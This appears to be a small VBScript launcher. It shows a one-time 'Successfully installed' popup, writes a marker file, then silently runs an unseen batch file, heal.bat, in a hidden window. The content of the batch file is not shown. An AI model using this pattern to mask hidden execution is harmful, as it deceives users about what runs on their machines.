Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Path to marker file to indicate popup has been shown
markerFile = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\popup_shown.txt"

' Check if the marker file exists (i.e., if the popup has been shown)
If Not objFSO.FileExists(markerFile) Then
    ' Show the popup message only once
    objShell.Popup "Successfully installed", 5, "Installation", 64

    ' Create the marker file to indicate the popup has been shown
    Set marker = objFSO.CreateTextFile(markerFile)
    marker.WriteLine "Popup shown"
    marker.Close
End If

' Path to the batch file in the same folder
batFilePath = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\heal.bat"

' Execute the batch file silently
objShell.Run """" & batFilePath & """", 0, False
